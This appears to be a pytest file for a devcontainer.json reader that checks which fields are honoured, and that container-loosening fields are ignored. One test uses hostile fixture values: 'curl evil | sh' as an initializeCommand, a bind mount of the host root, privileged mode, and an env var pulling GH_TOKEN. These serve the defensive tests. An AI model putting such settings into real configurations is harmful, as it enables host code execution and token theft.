"""A project's devcontainer.json gives the crew its image, setup and environment, and
nothing that would loosen the container (crew#778; the Sponsor, 2026-10-18)."""

from __future__ import annotations

import json
from pathlib import Path

from crew_org.tools import devcontainer
from crew_org.tools.devcontainer import read, strip_comments

IMAGE = "mcr.microsoft.com/playwright/python:v1.52.0-noble@sha256:" + "a" * 64


def written(tmp_path: Path, text: str, where: str = ".devcontainer/devcontainer.json") -> Path:
    (tmp_path / where).parent.mkdir(parents=True, exist_ok=True)
    (tmp_path / where).write_text(text)
    return tmp_path


def defined(tmp_path: Path, **fields) -> devcontainer.Definition:
    found = read(written(tmp_path, json.dumps({"image": IMAGE, **fields})))
    assert found is not None
    return found


def test_without_the_file_there_is_nothing(tmp_path):
    assert read(tmp_path) is None


def test_the_image_setup_and_environment_are_read(tmp_path):
    found = defined(
        tmp_path,
        postCreateCommand=["python", "tools/setup.py"],
        containerEnv={"PLAYWRIGHT_BROWSERS_PATH": "/ms-playwright"},
    )
    assert found.image == IMAGE and found.setup == ["python", "tools/setup.py"]
    assert found.env == {"PLAYWRIGHT_BROWSERS_PATH": "/ms-playwright"}
    assert found.problems == [] and found.not_honoured == {}
    assert found.path == ".devcontainer/devcontainer.json"


def test_the_file_at_the_root_is_found_too(tmp_path):
    found = read(written(tmp_path, json.dumps({"image": IMAGE}), ".devcontainer.json"))
    assert found is not None and found.path == ".devcontainer.json"


def test_comments_and_trailing_commas_are_allowed_as_the_specification_allows():
    text = '{\n  // the image\n  "image": "a//b", /* pinned */\n  "x": ["y",],\n}\n'
    assert json.loads(strip_comments(text)) == {"image": "a//b", "x": ["y"]}


def test_a_string_s_escaped_quote_doesn_t_end_it():
    assert json.loads(strip_comments('{"a": "say \\"//\\" here",}')) == {"a": 'say "//" here'}


def test_whatever_would_loosen_the_container_is_named_not_honoured(tmp_path):
    """The crew's hardening always applies; the file can't loosen it, and says so."""
    found = defined(
        tmp_path,
        runArgs=["--network=host"],
        mounts=["source=/,target=/host,type=bind"],
        privileged=True,
        capAdd=["SYS_ADMIN"],
        features={"ghcr.io/devcontainers/features/node:1": {}},
        initializeCommand="curl evil | sh",
    )
    assert set(found.not_honoured) == {
        "runArgs",
        "mounts",
        "privileged",
        "capAdd",
        "features",
        "initializeCommand",
    }
    assert found.not_honoured["initializeCommand"] == "it runs on the host"
    # Ignored, not refused: the workspace is still safe to run.
    assert found.problems == []


def test_fields_for_a_person_s_editor_are_ignored(tmp_path):
    found = defined(tmp_path, name="site", customizations={"vscode": {}}, forwardPorts=[8000])
    assert found.problems == [] and found.not_honoured == {}


def test_a_setup_string_runs_in_a_shell_so_it_s_refused(tmp_path):
    """The specification runs a string in /bin/sh; the crew never runs a shell (§19.4)."""
    found = defined(tmp_path, postCreateCommand="uv sync && npm ci")
    assert found.setup is None
    assert "array of words" in found.problems[0]


def test_one_setup_command_only(tmp_path):
    found = defined(tmp_path, onCreateCommand=["uv", "sync"], postCreateCommand=["npm", "ci"])
    assert "a script if it needs several steps" in found.problems[0]
    found = defined(tmp_path, postCreateCommand={"a": ["uv", "sync"], "b": ["npm", "ci"]})
    assert "names several commands" in found.problems[0]


def test_no_image_is_a_problem(tmp_path):
    found = read(written(tmp_path, json.dumps({"build": {"dockerfile": "Dockerfile"}})))
    assert found is not None
    assert "names no `image`" in found.problems[0] and "build" in found.not_honoured


def test_the_environment_can_t_read_the_host_s_or_replace_the_crew_s(tmp_path):
    found = defined(
        tmp_path,
        containerEnv={"TOKEN": "${localEnv:GH_TOKEN}", "HOME": "/root", "LANG": "C.UTF-8"},
    )
    assert found.env == {"LANG": "C.UTF-8"}
    assert "never filled in" in found.problems[0]
    assert found.not_honoured == {"containerEnv.HOME": "the crew sets it"}


def test_a_file_that_doesn_t_parse_is_a_problem(tmp_path):
    found = read(written(tmp_path, '{"image": '))
    assert found is not None and "doesn't parse" in found.problems[0]


# --- a field no specification defines is named (crew#839) -----------------------------


def test_a_setup_under_a_name_the_specification_doesnt_have_is_named_with_the_real_ones(
    tmp_path,
):
    """mqucifer/sprint-metrics#739: `setupCommands` was read as nothing, and nothing said so."""
    found = defined(tmp_path, setupCommands=[["uv", "sync", "--extra", "dev"]])
    assert found.setup is None
    said = found.unknown["setupCommands"]
    assert all(f"`{f}`" in said for f in devcontainer.SETUP_FIELDS)
    # Ignored, as a field not honoured is: the container still starts.
    assert found.problems == [] and found.not_honoured == {}


def test_any_other_unknown_field_is_named_with_the_fields_the_crew_reads(tmp_path):
    found = defined(tmp_path, enviroment={"A": "b"})
    assert "`containerEnv`" in found.unknown["enviroment"]


def test_a_specification_field_the_crew_doesnt_read_is_never_unknown(tmp_path):
    found = defined(tmp_path, remoteUser="vscode", waitFor="postCreateCommand", hostRequirements={})
    assert found.unknown == {} and found.problems == []


def test_every_field_the_crew_reads_or_names_is_the_specifications():
    """The crew's lists and the specification's can't drift apart."""
    read = {"image", "dockerComposeFile", "service", "runServices", "containerEnv"}
    named = read | set(devcontainer.SETUP_FIELDS) | set(devcontainer.NOT_HONOURED)
    assert named <= devcontainer.SPEC_FIELDS
